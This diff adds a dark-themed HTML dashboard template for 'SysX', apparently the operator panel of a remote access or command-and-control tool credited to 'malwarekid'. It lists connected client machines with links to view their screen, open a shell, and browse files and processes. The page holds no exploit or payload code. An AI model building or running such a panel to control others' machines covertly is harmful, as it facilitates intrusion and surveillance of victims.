@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>SysX — Dashboard</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  * { box-sizing: border-box; }
+  body {
+    background-color: #121212;
+    color: #e0e0e0;
+    font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif;
+    margin: 0;
+    padding-bottom: 60px;
+  }
+
+  /* Header */
+  header {
+    background-color: #1e1e1e;
+    border-top: 4px solid #3a6ea5;
+    padding: 10px 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  .title-container {
+    font-size: 16px;
+    font-weight: 600;
+    color: #fff;
+  }
+  .logout {
+    background: #d9534f;
+    color: #fff;
+    padding: 6px 12px;
+    border-radius: 4px;
+    text-decoration: none;
+    font-size: 13px;
+    transition: background 0.3s ease;
+  }
+  .logout:hover { background: #c9302c; }
+
+  /* Stats & Filters */
+  .stats {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 25px;
+    flex-wrap: wrap;
+    padding: 20px;
+  }
+  .filters {
+    display: flex;
+    gap: 10px;
+    align-items: center;
+  }
+  .search-input, .os-filter {
+    padding: 8px 10px;
+    border-radius: 6px;
+    border: none;
+    outline: none;
+    background: #1e1e1e;
+    color: #fff;
+    font-size: 13px;
+    height: 38px;
+    box-shadow: inset 0 0 4px rgba(0,0,0,0.4);
+  }
+  .search-input:focus, .os-filter:focus { box-shadow: 0 0 0 2px #3a8ef6; }
+  .stat-card {
+    background: #1e1e1e;
+    padding: 12px 16px;
+    border-radius: 8px;
+    text-align: center;
+    min-width: 120px;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+  }
+  .stat-number {
+    font-size: 20px;
+    font-weight: 700;
+    color: #3a8ef6;
+  }
+  .stat-label {
+    font-size: 12px;
+    color: #b0b0b0;
+  }
+
+  /* Table */
+  table {
+    width: calc(100% - 40px);
+    margin: 0 auto 20px;
+    border-collapse: collapse;
+    background: #1e1e1e;
+    border-radius: 10px;
+    overflow: hidden;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+  }
+  th, td {
+    padding: 12px 14px;
+    text-align: left;
+    font-size: 13px;
+    border-bottom: 1px solid rgba(255,255,255,0.05);
+  }
+  th {
+    background: #2a2a2a;
+    font-weight: 600;
+    color: #b0b0b0;
+  }
+  tr:hover td { background: rgba(58,142,246,0.05); }
+
+  /* Status badges */
+  .status-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 4px 10px;
+    border-radius: 20px;
+    font-size: 12px;
+    font-weight: 500;
+  }
+  .status-dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+  }
+  .online { background: rgba(40,167,69,0.15); color: #28a745; border: 1px solid #28a745; }
+  .online .status-dot { background: #28a745; box-shadow: 0 0 6px #28a745; }
+  .offline { background: rgba(220,53,69,0.15); color: #dc3545; border: 1px solid #dc3545; }
+  .offline .status-dot { background: #dc3545; box-shadow: 0 0 6px #dc3545; }
+
+  /* Action buttons */
+  .actions a {
+    padding: 5px 8px;
+    border-radius: 6px;
+    font-size: 12px;
+    text-decoration: none;
+    margin-right: 4px;
+    color: #fff;
+    transition: transform 0.2s ease, opacity 0.2s ease;
+  }
+  .btn-screen { background: #3a8ef6; }
+  .btn-shell { background: #6c757d; }
+  .btn-files { background: #17a2b8; }
+  .btn-proc { background: #d9534f; }
+  .actions a:hover { transform: translateY(-2px); opacity: 0.9; }
+
+  /* Footer */
+  footer {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background: #1e1e1e;
+      color: #b0b0b0;
+      font-size: 12px;
+      text-align: center;
+      padding: 8px 0;
+      border-top: 1px solid #2e2e2e;
+  }
+  footer a { color: #3a6ea5; text-decoration: none; }
+  footer a:hover { text-decoration: underline; }
+
+  @media (max-width: 768px) {
+    table, th, td { font-size: 11px; }
+    .stats { flex-direction: column; }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="title-container">SysX — Dashboard</div>
+  <a href="/logout" class="logout">Logout</a>
+</header>
+
+<div class="stats">
+  <div class="filters">
+    <input type="text" id="clientSearch" class="search-input" placeholder="Search clients...">
+    <select id="osFilter" class="os-filter">
+      <option value="">All OS</option>
+      <option value="windows">Windows</option>
+      <option value="linux">Linux</option>
+    </select>
+  </div>
+  <div class="stat-card">
+    <div class="stat-number">{{len .}}</div>
+    <div class="stat-label">Total Clients</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-number">{{range .}}{{if eq .Status "online"}}1{{end}}{{end}}</div>
+    <div class="stat-label">Online</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-number">{{range .}}{{if eq .Status "offline"}}1{{end}}{{end}}</div>
+    <div class="stat-label">Offline</div>
+  </div>
+</div>
+
+{{if .}}
+<table id="clientsTable">
+  <thead>
+    <tr>
+      <th>Client ID</th>
+      <th>OS</th>
+      <th>Runtime</th>
+      <th>Status</th>
+      <th>Actions</th>
+    </tr>
+  </thead>
+  <tbody>
+    {{range .}}
+    <tr>
+      <td>{{.ID}}</td>
+      <td>{{if .OS}}{{.OS}}{{else}}Unknown{{end}}</td>
+      <td>{{if .Version}}{{.Version}}{{else}}Unknown{{end}}</td>
+      <td>
+        <span class="status-badge {{.StatusClass}}">
+          <span class="status-dot"></span>{{.Status}}
+        </span>
+      </td>
+      <td class="actions">
+        <a href="/viewer?client={{.ID}}" class="btn-screen">📺 View</a>
+        <a href="/shell?client={{.ID}}" class="btn-shell">💻 Shell</a>
+        <a href="/files?client={{.ID}}" class="btn-files">📁 Files</a>
+        <a href="/processes?client={{.ID}}" class="btn-proc">⚙️ Processes</a>
+      </td>
+    </tr>
+    {{end}}
+  </tbody>
+</table>
+{{else}}
+<div style="text-align:center; padding:20px; color:#b0b0b0;">No Clients Connected</div>
+{{end}}
+
+<footer>
+  SysX — Access. Execute. Monitor. | Created by <a href="https://github.com/malwarekid" target="_blank">malwarekid</a>
+</footer>
+
+<script>
+  const searchInput = document.getElementById('clientSearch');
+  const osFilter = document.getElementById('osFilter');
+
+  function filterTable() {
+    const term = searchInput.value.toLowerCase();
+    const os = osFilter.value;
+    document.querySelectorAll('#clientsTable tbody tr').forEach(row => {
+      const clientId = row.cells[0].textContent.toLowerCase();
+      const osCell = row.cells[1].textContent.toLowerCase();
+      const matchesSearch = !term || clientId.includes(term) || osCell.includes(term);
+      const matchesOS = !os || osCell.includes(os);
+      row.style.display = matchesSearch && matchesOS ? '' : 'none';
+    });
+  }
+  searchInput.addEventListener('keyup', filterTable);
+  osFilter.addEventListener('change', filterTable);
+
+  setInterval(() => {
+    fetch(window.location.href)
+      .then(res => res.text())
+      .then(html => {
+        const parser = new DOMParser();
+        const doc = parser.parseFromString(html, 'text/html');
+        const newTbody = doc.querySelector('#clientsTable tbody');
+        if (newTbody) {
+          document.querySelector('#clientsTable tbody').innerHTML = newTbody.innerHTML;
+          filterTable();
+        }
+      })
+      .catch(err => console.error('Auto-refresh failed:', err));
+  }, 10000);
+</script>
+
+</body>
+</html>
